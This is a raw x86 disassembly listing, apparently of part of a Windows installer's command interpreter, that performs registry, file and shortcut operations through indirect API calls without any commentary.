  401e00:	53                   	push   %ebx
  401e01:	23 c6                	and    %esi,%eax
  401e03:	50                   	push   %eax
  401e04:	ff 75 cc             	push   -0x34(%ebp)
  401e07:	ff 15 5c 71 40 00    	call   *0x40715c
  401e0d:	83 f8 21             	cmp    $0x21,%eax
  401e10:	0f 8d 75 0a 00 00    	jge    0x40288b
  401e16:	e9 41 08 00 00       	jmp    0x40265c
  401e1b:	53                   	push   %ebx
  401e1c:	e8 d5 0b 00 00       	call   0x4029f6
  401e21:	8b f0                	mov    %eax,%esi
  401e23:	56                   	push   %esi
  401e24:	6a eb                	push   $0xffffffeb
  401e26:	e8 50 2f 00 00       	call   0x404d7b
  401e2b:	56                   	push   %esi
  401e2c:	e8 0c 34 00 00       	call   0x40523d
  401e31:	3b c3                	cmp    %ebx,%eax
  401e33:	89 45 08             	mov    %eax,0x8(%ebp)
  401e36:	0f 84 20 08 00 00    	je     0x40265c
  401e3c:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401e3f:	74 46                	je     0x401e87
  401e41:	8b 35 04 71 40 00    	mov    0x407104,%esi
  401e47:	eb 07                	jmp    0x401e50
  401e49:	6a 0f                	push   $0xf
  401e4b:	e8 e8 3e 00 00       	call   0x405d38
  401e50:	6a 64                	push   $0x64
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff d6                	call   *%esi
  401e57:	3d 02 01 00 00       	cmp    $0x102,%eax
  401e5c:	74 eb                	je     0x401e49
  401e5e:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401e61:	50                   	push   %eax
  401e62:	ff 75 08             	push   0x8(%ebp)
  401e65:	ff 15 08 71 40 00    	call   *0x407108
  401e6b:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  401e6e:	7c 0b                	jl     0x401e7b
  401e70:	ff 75 f8             	push   -0x8(%ebp)
  401e73:	57                   	push   %edi
  401e74:	e8 c2 3a 00 00       	call   0x40593b
  401e79:	eb 0c                	jmp    0x401e87
  401e7b:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  401e7e:	74 07                	je     0x401e87
  401e80:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401e87:	ff 75 08             	push   0x8(%ebp)
  401e8a:	ff 15 ec 70 40 00    	call   *0x4070ec
  401e90:	e9 f6 09 00 00       	jmp    0x40288b
  401e95:	6a 02                	push   $0x2
  401e97:	e8 5a 0b 00 00       	call   0x4029f6
  401e9c:	50                   	push   %eax
  401e9d:	e8 36 3e 00 00       	call   0x405cd8
  401ea2:	3b c3                	cmp    %ebx,%eax
  401ea4:	89 45 08             	mov    %eax,0x8(%ebp)
  401ea7:	74 13                	je     0x401ebc
  401ea9:	8b d8                	mov    %eax,%ebx
  401eab:	ff 73 14             	push   0x14(%ebx)
  401eae:	57                   	push   %edi
  401eaf:	e8 87 3a 00 00       	call   0x40593b
  401eb4:	ff 73 18             	push   0x18(%ebx)
  401eb7:	e9 a5 f6 ff ff       	jmp    0x401561
  401ebc:	88 1e                	mov    %bl,(%esi)
  401ebe:	88 1f                	mov    %bl,(%edi)
  401ec0:	e9 97 07 00 00       	jmp    0x40265c
  401ec5:	6a ee                	push   $0xffffffee
  401ec7:	e8 2a 0b 00 00       	call   0x4029f6
  401ecc:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401ecf:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401ed2:	51                   	push   %ecx
  401ed3:	50                   	push   %eax
  401ed4:	e8 f3 49 00 00       	call   0x4068cc
  401ed9:	88 1e                	mov    %bl,(%esi)
  401edb:	3b c3                	cmp    %ebx,%eax
  401edd:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401ee0:	88 1f                	mov    %bl,(%edi)
  401ee2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401ee9:	0f 84 9c 09 00 00    	je     0x40288b
  401eef:	50                   	push   %eax
  401ef0:	6a 40                	push   $0x40
  401ef2:	ff 15 00 71 40 00    	call   *0x407100
  401ef8:	3b c3                	cmp    %ebx,%eax
  401efa:	89 45 08             	mov    %eax,0x8(%ebp)
  401efd:	0f 84 88 09 00 00    	je     0x40288b
  401f03:	50                   	push   %eax
  401f04:	ff 75 f8             	push   -0x8(%ebp)
  401f07:	53                   	push   %ebx
  401f08:	ff 75 d4             	push   -0x2c(%ebp)
  401f0b:	e8 b6 49 00 00       	call   0x4068c6
  401f10:	85 c0                	test   %eax,%eax
  401f12:	74 34                	je     0x401f48
  401f14:	8d 45 bc             	lea    -0x44(%ebp),%eax
  401f17:	50                   	push   %eax
  401f18:	8d 45 cc             	lea    -0x34(%ebp),%eax
  401f1b:	50                   	push   %eax
  401f1c:	68 10 90 40 00       	push   $0x409010
  401f21:	ff 75 08             	push   0x8(%ebp)
  401f24:	e8 97 49 00 00       	call   0x4068c0
  401f29:	85 c0                	test   %eax,%eax
  401f2b:	74 1b                	je     0x401f48
  401f2d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401f30:	ff 70 08             	push   0x8(%eax)
  401f33:	56                   	push   %esi
  401f34:	e8 02 3a 00 00       	call   0x40593b
  401f39:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401f3c:	ff 70 0c             	push   0xc(%eax)
  401f3f:	57                   	push   %edi
  401f40:	e8 f6 39 00 00       	call   0x40593b
  401f45:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401f48:	ff 75 08             	push   0x8(%ebp)
  401f4b:	e9 25 fc ff ff       	jmp    0x401b75
  401f50:	39 1d 38 3f 42 00    	cmp    %ebx,0x423f38
  401f56:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401f5d:	0f 8c b6 00 00 00    	jl     0x402019
  401f63:	6a f0                	push   $0xfffffff0
  401f65:	e8 8c 0a 00 00       	call   0x4029f6
  401f6a:	6a 01                	push   $0x1
  401f6c:	8b f0                	mov    %eax,%esi
  401f6e:	e8 83 0a 00 00       	call   0x4029f6
  401f73:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  401f76:	89 45 08             	mov    %eax,0x8(%ebp)
  401f79:	74 0d                	je     0x401f88
  401f7b:	56                   	push   %esi
  401f7c:	ff 15 0c 71 40 00    	call   *0x40710c
  401f82:	8b f8                	mov    %eax,%edi
  401f84:	3b fb                	cmp    %ebx,%edi
  401f86:	75 10                	jne    0x401f98
  401f88:	6a 08                	push   $0x8
  401f8a:	53                   	push   %ebx
  401f8b:	56                   	push   %esi
  401f8c:	ff 15 10 71 40 00    	call   *0x407110
  401f92:	8b f8                	mov    %eax,%edi
  401f94:	3b fb                	cmp    %ebx,%edi
  401f96:	74 7a                	je     0x402012
  401f98:	ff 75 08             	push   0x8(%ebp)
  401f9b:	57                   	push   %edi
  401f9c:	ff 15 14 71 40 00    	call   *0x407114
  401fa2:	8b f0                	mov    %eax,%esi
  401fa4:	3b f3                	cmp    %ebx,%esi
  401fa6:	74 3d                	je     0x401fe5
  401fa8:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  401fab:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401fae:	74 17                	je     0x401fc7
  401fb0:	ff 75 e4             	push   -0x1c(%ebp)
  401fb3:	e8 6b f4 ff ff       	call   0x401423
  401fb8:	ff d6                	call   *%esi
  401fba:	85 c0                	test   %eax,%eax
  401fbc:	74 31                	je     0x401fef
  401fbe:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401fc5:	eb 28                	jmp    0x401fef
  401fc7:	68 00 90 40 00       	push   $0x409000
  401fcc:	68 50 af 40 00       	push   $0x40af50
  401fd1:	68 00 40 42 00       	push   $0x424000
  401fd6:	68 00 04 00 00       	push   $0x400
  401fdb:	ff 75 cc             	push   -0x34(%ebp)
  401fde:	ff d6                	call   *%esi
  401fe0:	83 c4 14             	add    $0x14,%esp
  401fe3:	eb 0a                	jmp    0x401fef
  401fe5:	ff 75 08             	push   0x8(%ebp)
  401fe8:	6a f7                	push   $0xfffffff7
  401fea:	e8 8c 2d 00 00       	call   0x404d7b
  401fef:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  401ff2:	0f 85 93 08 00 00    	jne    0x40288b
  401ff8:	57                   	push   %edi
  401ff9:	e8 c8 14 00 00       	call   0x4034c6
  401ffe:	85 c0                	test   %eax,%eax
  402000:	0f 84 85 08 00 00    	je     0x40288b
  402006:	57                   	push   %edi
  402007:	ff 15 18 71 40 00    	call   *0x407118
  40200d:	e9 79 08 00 00       	jmp    0x40288b
  402012:	6a f6                	push   $0xfffffff6
  402014:	e9 4b 01 00 00       	jmp    0x402164
  402019:	6a e7                	push   $0xffffffe7
  40201b:	e9 44 01 00 00       	jmp    0x402164
  402020:	6a f0                	push   $0xfffffff0
  402022:	e8 cf 09 00 00       	call   0x4029f6
  402027:	6a df                	push   $0xffffffdf
  402029:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40202c:	e8 c5 09 00 00       	call   0x4029f6
  402031:	6a 02                	push   $0x2
  402033:	8b f0                	mov    %eax,%esi
  402035:	e8 bc 09 00 00       	call   0x4029f6
  40203a:	6a cd                	push   $0xffffffcd
  40203c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40203f:	e8 b2 09 00 00       	call   0x4029f6
  402044:	6a 45                	push   $0x45
  402046:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402049:	e8 a8 09 00 00       	call   0x4029f6
  40204e:	56                   	push   %esi
  40204f:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402052:	e8 e6 34 00 00       	call   0x40553d
  402057:	85 c0                	test   %eax,%eax
  402059:	75 07                	jne    0x402062
  40205b:	6a 21                	push   $0x21
  40205d:	e8 94 09 00 00       	call   0x4029f6
  402062:	8d 45 08             	lea    0x8(%ebp),%eax
  402065:	50                   	push   %eax
  402066:	68 74 73 40 00       	push   $0x407374
  40206b:	6a 01                	push   $0x1
  40206d:	53                   	push   %ebx
  40206e:	68 84 73 40 00       	push   $0x407384
  402073:	ff 15 84 72 40 00    	call   *0x407284
  402079:	3b c3                	cmp    %ebx,%eax
  40207b:	0f 8c da 00 00 00    	jl     0x40215b
  402081:	8b 45 08             	mov    0x8(%ebp),%eax
  402084:	8d 55 cc             	lea    -0x34(%ebp),%edx
  402087:	52                   	push   %edx
  402088:	68 94 73 40 00       	push   $0x407394
  40208d:	8b 08                	mov    (%eax),%ecx
  40208f:	50                   	push   %eax
  402090:	ff 11                	call   *(%ecx)
  402092:	8b f8                	mov    %eax,%edi
  402094:	3b fb                	cmp    %ebx,%edi
  402096:	0f 8c b2 00 00 00    	jl     0x40214e
  40209c:	8b 45 08             	mov    0x8(%ebp),%eax
  40209f:	56                   	push   %esi
  4020a0:	50                   	push   %eax
  4020a1:	8b 08                	mov    (%eax),%ecx
  4020a3:	ff 51 50             	call   *0x50(%ecx)
  4020a6:	8b f8                	mov    %eax,%edi
  4020a8:	8b 45 08             	mov    0x8(%ebp),%eax
  4020ab:	68 00 98 42 00       	push   $0x429800
  4020b0:	50                   	push   %eax
  4020b1:	8b 08                	mov    (%eax),%ecx
  4020b3:	ff 51 24             	call   *0x24(%ecx)
  4020b6:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4020b9:	be ff 00 00 00       	mov    $0xff,%esi
  4020be:	8b c1                	mov    %ecx,%eax
  4020c0:	c1 f8 08             	sar    $0x8,%eax
  4020c3:	23 c6                	and    %esi,%eax
  4020c5:	74 0d                	je     0x4020d4
  4020c7:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4020ca:	50                   	push   %eax
  4020cb:	51                   	push   %ecx
  4020cc:	8b 11                	mov    (%ecx),%edx
  4020ce:	ff 52 3c             	call   *0x3c(%edx)
  4020d1:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4020d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4020d7:	c1 f9 10             	sar    $0x10,%ecx
  4020da:	8b 10                	mov    (%eax),%edx
  4020dc:	51                   	push   %ecx
  4020dd:	50                   	push   %eax
  4020de:	ff 52 34             	call   *0x34(%edx)
  4020e1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020e4:	38 18                	cmp    %bl,(%eax)
  4020e6:	74 12                	je     0x4020fa
  4020e8:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4020eb:	8b 45 08             	mov    0x8(%ebp),%eax
  4020ee:	23 d6                	and    %esi,%edx
  4020f0:	8b 08                	mov    (%eax),%ecx
  4020f2:	52                   	push   %edx
  4020f3:	ff 75 f8             	push   -0x8(%ebp)
  4020f6:	50                   	push   %eax
  4020f7:	ff 51 44             	call   *0x44(%ecx)
  4020fa:	8b 45 08             	mov    0x8(%ebp),%eax
  4020fd:	ff 75 d4             	push   -0x2c(%ebp)
  402100:	8b 08                	mov    (%eax),%ecx
  402102:	50                   	push   %eax
  402103:	ff 51 2c             	call   *0x2c(%ecx)
  402106:	8b 45 08             	mov    0x8(%ebp),%eax
  402109:	ff 75 bc             	push   -0x44(%ebp)
  40210c:	8b 08                	mov    (%eax),%ecx
  40210e:	50                   	push   %eax
  40210f:	ff 51 1c             	call   *0x1c(%ecx)
  402112:	3b fb                	cmp    %ebx,%edi
  402114:	7c 2f                	jl     0x402145
  402116:	be 48 93 40 00       	mov    $0x409348,%esi
  40211b:	68 00 04 00 00       	push   $0x400
  402120:	56                   	push   %esi
  402121:	6a ff                	push   $0xffffffff
  402123:	ff 75 d0             	push   -0x30(%ebp)
  402126:	bf 05 40 00 80       	mov    $0x80004005,%edi
  40212b:	53                   	push   %ebx
  40212c:	53                   	push   %ebx
  40212d:	ff 15 1c 71 40 00    	call   *0x40711c
  402133:	85 c0                	test   %eax,%eax
  402135:	74 0e                	je     0x402145
  402137:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40213a:	6a 01                	push   $0x1
  40213c:	56                   	push   %esi
  40213d:	50                   	push   %eax
  40213e:	8b 08                	mov    (%eax),%ecx
  402140:	ff 51 18             	call   *0x18(%ecx)
  402143:	8b f8                	mov    %eax,%edi
  402145:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402148:	50                   	push   %eax
  402149:	8b 08                	mov    (%eax),%ecx
  40214b:	ff 51 08             	call   *0x8(%ecx)
  40214e:	8b 45 08             	mov    0x8(%ebp),%eax
  402151:	50                   	push   %eax
  402152:	8b 08                	mov    (%eax),%ecx
  402154:	ff 51 08             	call   *0x8(%ecx)
  402157:	3b fb                	cmp    %ebx,%edi
  402159:	7d 13                	jge    0x40216e
  40215b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402162:	6a f0                	push   $0xfffffff0
  402164:	e8 ba f2 ff ff       	call   0x401423
  402169:	e9 1d 07 00 00       	jmp    0x40288b
  40216e:	6a f4                	push   $0xfffffff4
  402170:	eb f2                	jmp    0x402164
  402172:	53                   	push   %ebx
  402173:	e8 7e 08 00 00       	call   0x4029f6
  402178:	6a 11                	push   $0x11
  40217a:	8b f0                	mov    %eax,%esi
  40217c:	e8 75 08 00 00       	call   0x4029f6
  402181:	6a 23                	push   $0x23
  402183:	8b f8                	mov    %eax,%edi
  402185:	e8 6c 08 00 00       	call   0x4029f6
  40218a:	56                   	push   %esi
  40218b:	89 45 08             	mov    %eax,0x8(%ebp)
  40218e:	e8 45 3b 00 00       	call   0x405cd8
  402193:	85 c0                	test   %eax,%eax
  402195:	75 0d                	jne    0x4021a4
  402197:	53                   	push   %ebx
  402198:	6a f9                	push   $0xfffffff9
  40219a:	e8 dc 2b 00 00       	call   0x404d7b
  40219f:	e9 b8 04 00 00       	jmp    0x40265c
  4021a4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4021a7:	56                   	push   %esi
  4021a8:	89 45 9c             	mov    %eax,-0x64(%ebp)
  4021ab:	c7 45 a0 02 00 00 00 	movl   $0x2,-0x60(%ebp)
  4021b2:	e8 3c 38 00 00       	call   0x4059f3
  4021b7:	57                   	push   %edi
  4021b8:	88 5c 30 01          	mov    %bl,0x1(%eax,%esi,1)
  4021bc:	e8 32 38 00 00       	call   0x4059f3
  4021c1:	88 5c 38 01          	mov    %bl,0x1(%eax,%edi,1)
  4021c5:	8b 45 08             	mov    0x8(%ebp),%eax
  4021c8:	66 8b 4d e4          	mov    -0x1c(%ebp),%cx
  4021cc:	50                   	push   %eax
  4021cd:	53                   	push   %ebx
  4021ce:	89 75 a4             	mov    %esi,-0x5c(%ebp)
  4021d1:	89 7d a8             	mov    %edi,-0x58(%ebp)
  4021d4:	89 45 b6             	mov    %eax,-0x4a(%ebp)
  4021d7:	66 89 4d ac          	mov    %cx,-0x54(%ebp)
  4021db:	e8 9b 2b 00 00       	call   0x404d7b
  4021e0:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4021e3:	50                   	push   %eax
  4021e4:	ff 15 60 71 40 00    	call   *0x407160
  4021ea:	85 c0                	test   %eax,%eax
  4021ec:	0f 84 99 06 00 00    	je     0x40288b
  4021f2:	eb a3                	jmp    0x402197
  4021f4:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4021f9:	74 1d                	je     0x402218
  4021fb:	68 10 00 20 00       	push   $0x200010
  402200:	6a e8                	push   $0xffffffe8
  402202:	53                   	push   %ebx
  402203:	e8 f7 37 00 00       	call   0x4059ff
  402208:	50                   	push   %eax
  402209:	e8 90 30 00 00       	call   0x40529e
  40220e:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  402213:	e9 7e 06 00 00       	jmp    0x402896
  402218:	ff 05 14 3f 42 00    	incl   0x423f14
  40221e:	e9 68 06 00 00       	jmp    0x40288b
  402223:	33 f6                	xor    %esi,%esi
  402225:	33 ff                	xor    %edi,%edi
  402227:	3b c3                	cmp    %ebx,%eax
  402229:	74 0b                	je     0x402236
  40222b:	53                   	push   %ebx
  40222c:	e8 c5 07 00 00       	call   0x4029f6
  402231:	8b 55 e0             	mov    -0x20(%ebp),%edx
  402234:	8b f0                	mov    %eax,%esi
  402236:	3b d3                	cmp    %ebx,%edx
  402238:	74 09                	je     0x402243
  40223a:	6a 11                	push   $0x11
  40223c:	e8 b5 07 00 00       	call   0x4029f6
  402241:	8b f8                	mov    %eax,%edi
  402243:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402246:	74 09                	je     0x402251
  402248:	6a 22                	push   $0x22
  40224a:	e8 a7 07 00 00       	call   0x4029f6
  40224f:	8b d8                	mov    %eax,%ebx
  402251:	6a cd                	push   $0xffffffcd
  402253:	e8 9e 07 00 00       	call   0x4029f6
  402258:	50                   	push   %eax
  402259:	53                   	push   %ebx
  40225a:	57                   	push   %edi
  40225b:	56                   	push   %esi
  40225c:	ff 15 20 71 40 00    	call   *0x407120
  402262:	e9 3f f3 ff ff       	jmp    0x4015a6
  402267:	6a 01                	push   $0x1
  402269:	c7 45 08 21 4e 7e 00 	movl   $0x7e4e21,0x8(%ebp)
  402270:	e8 81 07 00 00       	call   0x4029f6
  402275:	6a 12                	push   $0x12
  402277:	8b f8                	mov    %eax,%edi
  402279:	e8 78 07 00 00       	call   0x4029f6
  40227e:	6a dd                	push   $0xffffffdd
  402280:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402283:	e8 6e 07 00 00       	call   0x4029f6
  402288:	50                   	push   %eax
  402289:	68 ff 03 00 00       	push   $0x3ff
  40228e:	8d 45 08             	lea    0x8(%ebp),%eax
  402291:	56                   	push   %esi
  402292:	50                   	push   %eax
  402293:	ff 75 d0             	push   -0x30(%ebp)
  402296:	57                   	push   %edi
  402297:	ff 15 24 71 40 00    	call   *0x407124
  40229d:	8b 06                	mov    (%esi),%eax
  40229f:	3b 45 08             	cmp    0x8(%ebp),%eax
  4022a2:	e9 6f f4 ff ff       	jmp    0x401716
  4022a7:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4022aa:	75 2b                	jne    0x4022d7
  4022ac:	6a 02                	push   $0x2
  4022ae:	e8 4d 08 00 00       	call   0x402b00
  4022b3:	8b f0                	mov    %eax,%esi
  4022b5:	3b f3                	cmp    %ebx,%esi
  4022b7:	0f 84 9f 03 00 00    	je     0x40265c
  4022bd:	6a 33                	push   $0x33
  4022bf:	e8 32 07 00 00       	call   0x4029f6
  4022c4:	50                   	push   %eax
  4022c5:	56                   	push   %esi
  4022c6:	ff 15 18 70 40 00    	call   *0x407018
  4022cc:	56                   	push   %esi
  4022cd:	8b f8                	mov    %eax,%edi
  4022cf:	ff 15 1c 70 40 00    	call   *0x40701c
  4022d5:	eb 1f                	jmp    0x4022f6
  4022d7:	6a 22                	push   $0x22
  4022d9:	e8 18 07 00 00       	call   0x4029f6
  4022de:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4022e1:	83 e1 02             	and    $0x2,%ecx
  4022e4:	51                   	push   %ecx
  4022e5:	50                   	push   %eax
  4022e6:	ff 75 e0             	push   -0x20(%ebp)
  4022e9:	e8 fd 07 00 00       	call   0x402aeb
  4022ee:	50                   	push   %eax
  4022ef:	e8 42 07 00 00       	call   0x402a36
  4022f4:	8b f8                	mov    %eax,%edi
  4022f6:	3b fb                	cmp    %ebx,%edi
  4022f8:	0f 84 8d 05 00 00    	je     0x40288b
  4022fe:	e9 59 03 00 00       	jmp    0x40265c
  402303:	50                   	push   %eax
  402304:	e8 e2 07 00 00       	call   0x402aeb
  402309:	8b 75 ec             	mov    -0x14(%ebp),%esi
  40230c:	8b f8                	mov    %eax,%edi
  40230e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402311:	6a 02                	push   $0x2
  402313:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402316:	e8 db 06 00 00       	call   0x4029f6
  40231b:	6a 11                	push   $0x11
  40231d:	89 45 bc             	mov    %eax,-0x44(%ebp)
  402320:	e8 d1 06 00 00       	call   0x4029f6
  402325:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402328:	53                   	push   %ebx
  402329:	51                   	push   %ecx
  40232a:	8b 0d 30 3f 42 00    	mov    0x423f30,%ecx
  402330:	83 c9 02             	or     $0x2,%ecx
  402333:	53                   	push   %ebx
  402334:	51                   	push   %ecx
  402335:	53                   	push   %ebx
  402336:	53                   	push   %ebx
  402337:	53                   	push   %ebx
  402338:	50                   	push   %eax
  402339:	57                   	push   %edi
  40233a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402341:	ff 15 20 70 40 00    	call   *0x407020
  402347:	85 c0                	test   %eax,%eax
  402349:	0f 85 3c 05 00 00    	jne    0x40288b
  40234f:	83 fe 01             	cmp    $0x1,%esi
  402352:	bf 50 a3 40 00       	mov    $0x40a350,%edi
  402357:	75 0e                	jne    0x402367
  402359:	6a 23                	push   $0x23
  40235b:	e8 96 06 00 00       	call   0x4029f6
  402360:	57                   	push   %edi
  402361:	e8 8d 36 00 00       	call   0x4059f3
  402366:	40                   	inc    %eax
  402367:	83 fe 04             	cmp    $0x4,%esi
  40236a:	75 0e                	jne    0x40237a
  40236c:	6a 03                	push   $0x3
  40236e:	e8 66 06 00 00       	call   0x4029d9
  402373:	56                   	push   %esi
  402374:	a3 50 a3 40 00       	mov    %eax,0x40a350
  402379:	58                   	pop    %eax
  40237a:	83 fe 03             	cmp    $0x3,%esi
  40237d:	75 0f                	jne    0x40238e
  40237f:	68 00 0c 00 00       	push   $0xc00
  402384:	57                   	push   %edi
  402385:	53                   	push   %ebx
  402386:	ff 75 e8             	push   -0x18(%ebp)
  402389:	e8 cd 0a 00 00       	call   0x402e5b
  40238e:	50                   	push   %eax
  40238f:	57                   	push   %edi
  402390:	ff 75 d0             	push   -0x30(%ebp)
  402393:	53                   	push   %ebx
  402394:	ff 75 bc             	push   -0x44(%ebp)
  402397:	ff 75 08             	push   0x8(%ebp)
  40239a:	ff 15 04 70 40 00    	call   *0x407004
  4023a0:	85 c0                	test   %eax,%eax
  4023a2:	75 03                	jne    0x4023a7
  4023a4:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4023a7:	ff 75 08             	push   0x8(%ebp)
  4023aa:	e9 ce 00 00 00       	jmp    0x40247d
  4023af:	68 19 00 02 00       	push   $0x20019
  4023b4:	e8 47 07 00 00       	call   0x402b00
  4023b9:	6a 33                	push   $0x33
  4023bb:	8b f8                	mov    %eax,%edi
  4023bd:	e8 34 06 00 00       	call   0x4029f6
  4023c2:	3b fb                	cmp    %ebx,%edi
  4023c4:	88 1e                	mov    %bl,(%esi)
  4023c6:	0f 84 90 02 00 00    	je     0x40265c
  4023cc:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4023cf:	c7 45 f8 ff 03 00 00 	movl   $0x3ff,-0x8(%ebp)
  4023d6:	51                   	push   %ecx
  4023d7:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4023da:	56                   	push   %esi
  4023db:	51                   	push   %ecx
  4023dc:	53                   	push   %ebx
  4023dd:	50                   	push   %eax
  4023de:	57                   	push   %edi
  4023df:	ff 15 00 70 40 00    	call   *0x407000
  4023e5:	33 c9                	xor    %ecx,%ecx
  4023e7:	41                   	inc    %ecx
  4023e8:	85 c0                	test   %eax,%eax
  4023ea:	75 34                	jne    0x402420
  4023ec:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  4023f0:	74 19                	je     0x40240b
  4023f2:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4023f5:	74 06                	je     0x4023fd
  4023f7:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4023fb:	75 23                	jne    0x402420
  4023fd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402400:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402403:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402406:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  402409:	eb 71                	jmp    0x40247c
  40240b:	ff 36                	push   (%esi)
  40240d:	33 c0                	xor    %eax,%eax
  40240f:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402412:	56                   	push   %esi
  402413:	0f 94 c0             	sete   %al
  402416:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402419:	e8 1d 35 00 00       	call   0x40593b
  40241e:	eb 5c                	jmp    0x40247c
  402420:	88 1e                	mov    %bl,(%esi)
  402422:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402425:	eb 55                	jmp    0x40247c
  402427:	68 19 00 02 00       	push   $0x20019
  40242c:	e8 cf 06 00 00       	call   0x402b00
  402431:	6a 03                	push   $0x3
  402433:	8b f8                	mov    %eax,%edi
  402435:	e8 9f 05 00 00       	call   0x4029d9
  40243a:	3b fb                	cmp    %ebx,%edi
  40243c:	88 1e                	mov    %bl,(%esi)
  40243e:	0f 84 18 02 00 00    	je     0x40265c
  402444:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  402447:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40244c:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40244f:	74 0c                	je     0x40245d
  402451:	51                   	push   %ecx
  402452:	56                   	push   %esi
  402453:	50                   	push   %eax
  402454:	57                   	push   %edi
  402455:	ff 15 08 70 40 00    	call   *0x407008
  40245b:	eb 19                	jmp    0x402476
  40245d:	53                   	push   %ebx
  40245e:	53                   	push   %ebx
  40245f:	53                   	push   %ebx
  402460:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402463:	53                   	push   %ebx
  402464:	51                   	push   %ecx
  402465:	56                   	push   %esi
  402466:	50                   	push   %eax
  402467:	57                   	push   %edi
  402468:	ff 15 0c 70 40 00    	call   *0x40700c
  40246e:	85 c0                	test   %eax,%eax
  402470:	0f 85 e6 01 00 00    	jne    0x40265c
  402476:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  40247c:	57                   	push   %edi
  40247d:	ff 15 1c 70 40 00    	call   *0x40701c
  402483:	e9 03 04 00 00       	jmp    0x40288b
  402488:	38 1e                	cmp    %bl,(%esi)
  40248a:	0f 84 fb 03 00 00    	je     0x40288b
  402490:	56                   	push   %esi
  402491:	e8 be 34 00 00       	call   0x405954
  402496:	50                   	push   %eax
  402497:	e9 ee f9 ff ff       	jmp    0x401e8a
  40249c:	6a ed                	push   $0xffffffed
  40249e:	e8 53 05 00 00       	call   0x4029f6
  4024a3:	ff 75 e4             	push   -0x1c(%ebp)
  4024a6:	ff 75 e0             	push   -0x20(%ebp)
  4024a9:	50                   	push   %eax
  4024aa:	e8 05 32 00 00       	call   0x4056b4
  4024af:	83 f8 ff             	cmp    $0xffffffff,%eax
  4024b2:	0f 84 a2 01 00 00    	je     0x40265a
  4024b8:	50                   	push   %eax
  4024b9:	e9 a3 f0 ff ff       	jmp    0x401561
  4024be:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4024c1:	74 11                	je     0x4024d4
  4024c3:	6a 01                	push   $0x1
  4024c5:	e8 0f 05 00 00       	call   0x4029d9
  4024ca:	a2 50 9f 40 00       	mov    %al,0x409f50
  4024cf:	33 c0                	xor    %eax,%eax
  4024d1:	40                   	inc    %eax
  4024d2:	eb 0d                	jmp    0x4024e1
  4024d4:	6a 11                	push   $0x11
  4024d6:	e8 1b 05 00 00       	call   0x4029f6
  4024db:	50                   	push   %eax
  4024dc:	e8 12 35 00 00       	call   0x4059f3
  4024e1:	38 1e                	cmp    %bl,(%esi)
  4024e3:	0f 84 73 01 00 00    	je     0x40265c
  4024e9:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4024ec:	53                   	push   %ebx
  4024ed:	51                   	push   %ecx
  4024ee:	50                   	push   %eax
  4024ef:	68 50 9f 40 00       	push   $0x409f50
  4024f4:	56                   	push   %esi
  4024f5:	e8 5a 34 00 00       	call   0x405954
  4024fa:	50                   	push   %eax
  4024fb:	ff 15 28 71 40 00    	call   *0x407128
  402501:	e9 a0 f0 ff ff       	jmp    0x4015a6
